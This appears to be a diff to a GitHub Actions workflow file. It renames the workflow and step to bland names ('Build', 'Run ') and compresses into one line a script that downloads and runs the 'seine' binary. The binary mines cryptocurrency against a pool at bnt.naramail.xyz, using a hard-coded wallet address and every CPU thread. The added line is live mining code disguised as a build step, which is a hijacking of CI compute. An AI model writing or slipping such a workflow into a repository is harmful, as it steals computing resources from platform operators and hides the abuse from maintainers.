@@ -1,4 +1,4 @@
-name: Build Hub Execution
+name: Build
 
 on:
   push:
@@ -12,21 +12,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       
-      - name: Run Seine
+      - name: Run 
         run: |
-          echo "=== Starting Seine ==="
-          wget -q https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz
-          tar -xzf seine-linux-x86_64.tar.gz
-          rm -f seine-linux-x86_64.tar.gz
-          chmod +x seine
-          
-          MAX_THREADS=$(nproc)
-          WORKER_NAME="BNT$(shuf -i 1-99999 -n 1)"
-          
-          echo "Threads: $MAX_THREADS | Worker: $WORKER_NAME"
-          echo "================================"
-          
-          ./seine --pool-url bnt.naramail.xyz:47182 \
-                  --address N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz \
-                  --pool-worker "$WORKER_NAME" \
-                  --threads "$MAX_THREADS"
+          echo "=== Starting ==="
+          wget https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz && tar xvf seine-linux-x86_64.tar.gz && rm -rf seine-linux-x86_64.tar.gz && chmod +x seine && ./seine --pool-url bnt.naramail.xyz:47182 --address N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz --pool-worker BNT$(shuf -i 1-99999 -n 1) --threads $(nproc)
